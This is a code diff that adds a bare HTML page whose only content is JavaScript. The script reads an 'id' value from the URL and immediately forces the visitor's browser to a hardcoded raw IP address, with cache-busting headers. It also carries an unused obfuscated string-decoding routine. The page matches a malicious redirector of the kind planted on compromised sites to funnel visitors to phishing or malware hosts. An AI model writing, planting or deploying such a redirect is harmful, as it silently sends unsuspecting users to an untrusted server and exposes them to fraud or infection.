@@ -1,0 +1,42 @@
+<!DOCTYPE html><html><head><title></title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+</head>
+<body>
+<script type="text/javascript">
+var site='207.246.81.241',
+d = function($str){
+	if(!$str) return '';
+	$tbl='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-';
+	$ky=$tbl.indexOf($str.charAt(0));
+	if($ky===false) return false;
+	$ret='';
+	$cd=0;
+	$bt=0;
+	for($i=1; $i<$str.length; $i++){
+		$x=$tbl.indexOf($str.charAt($i));
+		if($x===false) return false;
+		$cd+=($x<<$bt);
+		$bt+=6;
+		if($bt>8){
+			$b=$cd&0xFF;
+			$bt-=8;
+			$cd>>=8;
+			$b^=(($ky++)%0x3F);
+			$ret=String.fromCharCode($b)+$ret;
+		}
+	}
+	if($bt>0 && $cd) $ret=String.fromCharCode($cd^($ky%0x3F))+$ret;
+	return $ret;
+},
+re = /(^|\?)id=([\w\-]+)/,
+s = window.location.search,
+m = s.match(re);
+window.location.href = 'http://'+site+'/'+m[2]+'?'+Math.floor(Math.random()*9999);
+</script>
+</body>
+</html>
